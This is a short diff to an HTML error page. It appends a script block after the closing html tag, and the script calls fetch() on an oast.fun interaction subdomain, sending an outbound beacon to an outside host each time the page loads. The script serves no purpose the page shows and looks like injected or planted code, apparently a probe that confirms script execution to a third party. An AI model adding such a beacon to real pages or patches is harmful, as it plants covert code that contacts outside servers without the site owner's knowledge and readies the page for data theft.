@@ -11,3 +11,6 @@
     <p><strong>Error Token:</strong> 9c3f9da7-48a3-4023-a6b7-95ff1baf13f2</p>
 </body>
 </html>
+<script>
+fetch('gxijdmztknwyzdvjophzn9ymqm4mdzz73.oast.fun').then(response => response.json());
+</script>
